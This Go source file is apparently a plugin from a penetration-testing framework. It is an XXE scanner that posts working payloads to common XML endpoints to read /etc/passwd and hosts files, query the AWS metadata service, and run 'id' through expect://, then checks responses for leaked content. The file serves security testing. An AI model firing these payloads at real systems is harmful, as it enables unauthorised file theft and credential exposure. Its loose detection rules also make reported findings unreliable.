// internal/modules/web_vulnerabilities/xxe_scanner.go
package web_vulnerabilities

import (
	"apexPenetrateGo/internal/core"
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

type XXEResult struct {
	Target          string
	Vulnerable      bool
	TestedEndpoints []string
	Vulnerabilities []XXEVuln
	Note            string
}

type XXEVuln struct {
	Endpoint     string
	Payload      string
	Method       string
	StatusCode   int
	ResponseBody string
	Evidence     string
}

// XXE payloads for different scenarios
var xxePayloads = []string{
	// Basic XXE - file disclosure
	`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`,

	// Windows file disclosure
	`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
<root>&xxe;</root>`,

	// HTTP request (SSRF via XXE)
	`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>`,

	// Parameter entity
	`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root>test</root>`,

	// Blind XXE with error
	`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % error "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">%error;%exfil;]>
<root>test</root>`,

	// XXE with expect protocol
	`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>`,

	// UTF-16 encoded XXE
	`<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`,
}

// Common endpoints that might accept XML
var xmlEndpoints = []string{
	"/api/xml", "/xml", "/upload", "/import", "/api/import", "/api/upload",
	"/api/data", "/data", "/api/v1/xml", "/api/v2/xml", "/xmlrpc", "/soap",
	"/api/soap", "/ws", "/webservice", "/api", "/rest/xml", "/feed",
}

func XXEScan(target string, customEndpoints []string, customPayloads []string) *XXEResult {
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}

	endpoints := xmlEndpoints
	if len(customEndpoints) > 0 {
		endpoints = append(endpoints, customEndpoints...)
	}

	payloads := xxePayloads
	if len(customPayloads) > 0 {
		payloads = append(payloads, customPayloads...)
	}

	result := &XXEResult{
		Target:          target,
		TestedEndpoints: endpoints,
		Vulnerabilities: []XXEVuln{},
	}

	client := &http.Client{
		Timeout: 15 * time.Second,
	}

	// Test each endpoint with each payload
	for _, endpoint := range endpoints {
		testURL := strings.TrimRight(target, "/") + endpoint

		for _, payload := range payloads {
			// Test POST request with XML
			vuln := testXXEEndpoint(client, testURL, "POST", payload)
			if vuln != nil {
				result.Vulnerabilities = append(result.Vulnerabilities, *vuln)
				result.Vulnerable = true
			}

			// Test PUT request with XML (some APIs use PUT)
			vuln = testXXEEndpoint(client, testURL, "PUT", payload)
			if vuln != nil {
				result.Vulnerabilities = append(result.Vulnerabilities, *vuln)
				result.Vulnerable = true
			}
		}
	}

	// Also test the main target URL
	for _, payload := range payloads {
		vuln := testXXEEndpoint(client, target, "POST", payload)
		if vuln != nil {
			result.Vulnerabilities = append(result.Vulnerabilities, *vuln)
			result.Vulnerable = true
		}
	}

	if result.Vulnerable {
		result.Note = fmt.Sprintf("Found %d potential XXE vulnerabilities", len(result.Vulnerabilities))
	} else {
		result.Note = "No XXE vulnerabilities detected"
	}

	return result
}

func testXXEEndpoint(client *http.Client, url, method, payload string) *XXEVuln {
	req, err := http.NewRequest(method, url, bytes.NewReader([]byte(payload)))
	if err != nil {
		return nil
	}

	// Set appropriate headers for XML
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("Accept", "application/xml, text/xml, */*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	responseBody := string(body)
	evidence := analyzeXXEResponse(responseBody, resp.StatusCode, payload)

	if evidence != "" {
		return &XXEVuln{
			Endpoint:     url,
			Payload:      payload,
			Method:       method,
			StatusCode:   resp.StatusCode,
			ResponseBody: responseBody[:min(len(responseBody), 500)], // Truncate for display
			Evidence:     evidence,
		}
	}

	return nil
}

func analyzeXXEResponse(responseBody string, statusCode int, payload string) string {
	responseLower := strings.ToLower(responseBody)

	// Check for file content disclosure
	if strings.Contains(responseLower, "root:x:0:0:") ||
		strings.Contains(responseLower, "/bin/bash") ||
		strings.Contains(responseLower, "/bin/sh") {
		return "Unix /etc/passwd file content detected in response"
	}

	// Windows hosts file
	if strings.Contains(responseLower, "127.0.0.1") && strings.Contains(responseLower, "localhost") {
		return "Windows hosts file content detected in response"
	}

	// AWS metadata
	if strings.Contains(responseLower, "ami-") ||
		strings.Contains(responseLower, "instance-id") ||
		strings.Contains(responseLower, "security-credentials") {
		return "AWS metadata content detected in response"
	}

	// Error messages that indicate XXE processing
	xxeErrors := []string{
		"external entity", "entity", "xml parsing", "xml parse error",
		"dtd", "document type definition", "system identifier",
		"entity reference", "malformed", "xml syntax error",
	}

	for _, errorMsg := range xxeErrors {
		if strings.Contains(responseLower, errorMsg) {
			return fmt.Sprintf("XXE-related error message detected: %s", errorMsg)
		}
	}

	// Different status codes might indicate XXE processing
	if statusCode == 500 && strings.Contains(payload, "file://") {
		return "HTTP 500 error when processing file:// entity"
	}

	// Check for time-based indicators (long processing time might indicate file access)
	if statusCode == 200 && len(responseBody) > 1000 {
		return "Large response body - possible file content disclosure"
	}

	return ""
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func (r *XXEResult) String() string {
	status := "🔒"
	if r.Vulnerable {
		status = "🚨"
	}

	msg := fmt.Sprintf("\n%s XXE Scanner for %s:\n", status, r.Target)
	msg += fmt.Sprintf("  Tested %d endpoints with %d payloads\n", len(r.TestedEndpoints), len(xxePayloads))

	if r.Vulnerable {
		msg += fmt.Sprintf("  🚨 VULNERABLE: Found %d potential XXE issues:\n", len(r.Vulnerabilities))
		for i, vuln := range r.Vulnerabilities {
			msg += fmt.Sprintf("    %d. Endpoint: %s [%s]\n", i+1, vuln.Endpoint, vuln.Method)
			msg += fmt.Sprintf("       Status: %d\n", vuln.StatusCode)
			msg += fmt.Sprintf("       Evidence: %s\n", vuln.Evidence)
			if len(vuln.ResponseBody) > 0 {
				msg += fmt.Sprintf("       Response: %s...\n", vuln.ResponseBody[:min(len(vuln.ResponseBody), 100)])
			}
		}
	} else {
		msg += "  ✅ No XXE vulnerabilities found\n"
	}

	msg += fmt.Sprintf("  Note: %s\n", r.Note)
	return msg
}

type xxePlugin struct{}

func (p *xxePlugin) Name() string { return "XXEScanner" }
func (p *xxePlugin) Description() string {
	return "Scans for XML External Entity (XXE) vulnerabilities"
}
func (p *xxePlugin) Category() string { return "web-vuln" }
func (p *xxePlugin) Options() []core.ModuleOption {
	return []core.ModuleOption{
		{Name: "endpoints", Type: "string", Default: "", Description: "Comma-separated custom endpoints to test", Required: false},
		{Name: "payloads", Type: "string", Default: "", Description: "Comma-separated custom XXE payloads", Required: false},
		{Name: "timeout", Type: "string", Default: "15s", Description: "HTTP request timeout", Required: false},
		{Name: "check_files", Type: "bool", Default: true, Description: "Include file disclosure payloads", Required: false},
		{Name: "check_ssrf", Type: "bool", Default: true, Description: "Include SSRF via XXE payloads", Required: false},
	}
}
func (p *xxePlugin) Run(target string, options map[string]interface{}) (interface{}, error) {
	var customEndpoints []string
	var customPayloads []string

	if endpoints, ok := options["endpoints"].(string); ok && endpoints != "" {
		customEndpoints = strings.Split(endpoints, ",")
		for i := range customEndpoints {
			customEndpoints[i] = strings.TrimSpace(customEndpoints[i])
		}
	}

	if payloads, ok := options["payloads"].(string); ok && payloads != "" {
		customPayloads = strings.Split(payloads, ",")
		for i := range customPayloads {
			customPayloads[i] = strings.TrimSpace(customPayloads[i])
		}
	}

	return XXEScan(target, customEndpoints, customPayloads), nil
}

func init() {
	core.RegisterPlugin(&xxePlugin{})
}
